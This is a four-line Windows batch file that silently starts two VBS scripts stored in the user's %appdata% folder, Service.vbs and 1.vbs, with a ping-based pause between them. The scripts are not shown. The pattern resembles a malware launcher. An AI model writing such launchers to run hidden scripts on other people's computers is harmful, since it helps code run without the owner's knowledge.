@echo off
start %appdata%\Service.vbs
>nul ping 127.1 -n 3
start %appdata%\1.vbs